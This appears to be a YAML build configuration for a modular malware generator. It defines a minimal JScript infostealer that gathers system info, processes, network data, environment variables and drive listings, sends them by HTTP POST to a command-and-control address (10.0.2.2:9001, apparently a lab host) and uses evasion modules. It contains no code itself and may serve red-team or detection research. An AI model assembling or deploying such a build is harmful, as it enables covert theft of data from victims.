name: js_infostealer_minimal
description: Minimal JScript infostealer - small footprint, fast execution
format: jscript

core:
  - core/emit_buffer
  - core/run_cmd
  - core/file_ops

collectors:
  - collectors/sysinfo
  - collectors/processes
  - collectors/network
  - collectors/env_vars
  - collectors/drives

exfil: exfil/http_post
arch: arch/sequential

evasion:
  - evasion/deferred_exec
  - evasion/behavioral_pacing

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
